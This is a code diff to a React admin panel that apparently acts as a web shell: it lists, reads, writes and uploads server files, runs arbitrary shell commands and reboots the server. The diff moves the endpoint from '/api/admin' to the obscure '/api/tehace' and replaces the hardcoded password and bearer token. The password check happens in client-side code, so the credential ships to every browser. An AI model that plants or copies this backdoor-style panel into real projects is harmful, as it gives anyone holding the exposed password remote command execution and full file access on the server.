@@ -21,13 +21,13 @@ export default function AdminPanel() {
   const [rebootMessage, setRebootMessage] = useState('');
 
   const getAuthHeader = useCallback(() => ({
-    'Authorization': 'Bearer thc2019',
+    'Authorization': 'Bearer thcmyid2019',
     'Content-Type': 'application/json'
   }), []);
 
   const testApi = useCallback(async () => {
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'ping' })
@@ -43,7 +43,7 @@ export default function AdminPanel() {
   const loadFiles = useCallback(async (path: string) => {
     setLoading(true);
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'list', path })
@@ -70,7 +70,7 @@ export default function AdminPanel() {
     setLoading(true);
 
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'read', path: filePath })
@@ -94,7 +94,7 @@ export default function AdminPanel() {
     if (!selectedFile) return;
 
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({
@@ -119,7 +119,7 @@ export default function AdminPanel() {
     if (!command.trim()) return;
 
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'command', command: command })
@@ -146,7 +146,7 @@ export default function AdminPanel() {
     setRebootMessage('🔄 Initializing server reboot...');
 
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'reboot' })
@@ -189,7 +189,7 @@ export default function AdminPanel() {
     const reader = new FileReader();
     reader.onload = async (e) => {
       try {
-        const res = await fetch('/api/admin', {
+        const res = await fetch('/api/tehace', {
           method: 'POST',
           headers: getAuthHeader(),
           body: JSON.stringify({
@@ -240,7 +240,7 @@ export default function AdminPanel() {
     const dirPath = currentPath === '.' ? dirName : `${currentPath}/${dirName}`;
 
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({ action: 'mkdir', path: dirPath })
@@ -265,7 +265,7 @@ export default function AdminPanel() {
     const filePath = currentPath === '.' ? fileName : `${currentPath}/${fileName}`;
 
     try {
-      const res = await fetch('/api/admin', {
+      const res = await fetch('/api/tehace', {
         method: 'POST',
         headers: getAuthHeader(),
         body: JSON.stringify({
@@ -300,7 +300,7 @@ export default function AdminPanel() {
 
   const handleLogin = useCallback(async (e: React.FormEvent) => {
     e.preventDefault();
-    if (password === 'thc2019') {
+    if (password === 'thcmyid2019') {
       const apiWorking = await testApi();
       if (apiWorking) {
         setAuthenticated(true);
